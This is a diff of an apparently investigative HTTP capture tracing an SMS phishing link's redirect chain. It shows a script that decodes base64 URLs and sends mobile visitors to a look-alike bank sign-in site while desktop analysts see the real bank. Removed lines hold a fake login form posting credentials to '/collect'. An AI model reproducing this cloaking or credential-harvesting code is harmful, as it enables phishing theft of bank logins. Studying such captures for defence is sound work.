@@ -1,42 +1,52 @@
+# Captured in the sandbox: the link from the text message, opened in a desktop
+# browser (Windows, Chrome). The victim opened the same link on an iPhone.
+
 ### 1
 GET /x7Kp HTTP/1.1
-Host: short.example.invalid
+Host: sms.short.invalid
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
 
 HTTP/1.1 302 Found
-Location: https://t.news-click.invalid/r?u=8f3a2
+Location: https://t.news-click.invalid/r?u=8f3a2&c=sms
 
 ### 2
-GET /r?u=8f3a2 HTTP/1.1
+GET /r?u=8f3a2&c=sms HTTP/1.1
 Host: t.news-click.invalid
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
 
 HTTP/1.1 200 OK
 Content-Type: text/html
 
 <html><head>
-<meta http-equiv="refresh" content="0; url=https://gate.promo-wheel.invalid/go">
+<meta http-equiv="refresh" content="0; url=https://gate.promo-wheel.invalid/go?id=8f3a2">
 </head><body>Loading...</body></html>
 
 ### 3
-GET /go HTTP/1.1
+GET /go?id=8f3a2 HTTP/1.1
 Host: gate.promo-wheel.invalid
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
+Referer: https://t.news-click.invalid/
 
 HTTP/1.1 200 OK
 Content-Type: text/html
 
 <html><body>
 <script>
-  setTimeout(function () { window.location = atob("aHR0cHM6Ly9zZWN1cmUtYWNjb3VudC12ZXJpZnkuaW52YWxpZC9sb2dpbg=="); }, 400);
+  var a = "aHR0cHM6Ly93d3cuZXhhbXBsZWJhbmsuaW52YWxpZC8=";
+  var b = "aHR0cHM6Ly9zZWN1cmUtZXhhbXBsZWJhbmstbG9naW4uaW52YWxpZC9tL3NpZ25pbg==";
+  var m = /iPhone|iPad|Android/i.test(navigator.userAgent) && navigator.maxTouchPoints > 0;
+  setTimeout(function () { location.replace(atob(m ? b : a)); }, 400);
 </script>
 </body></html>
 
 ### 4
-GET /login HTTP/1.1
-Host: secure-account-verify.invalid
+GET / HTTP/1.1
+Host: www.examplebank.invalid
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
+Referer: https://gate.promo-wheel.invalid/
 
 HTTP/1.1 200 OK
 Content-Type: text/html
 
-<html><head><title>Sign in to your bank</title></head>
-<body><form method="post" action="/collect">
-<input name="user"><input name="pass" type="password"><button>Sign in</button>
-</form></body></html>
+<html><head><title>Example Bank | Personal banking</title></head>
+<body>(the bank's real home page)</body></html>
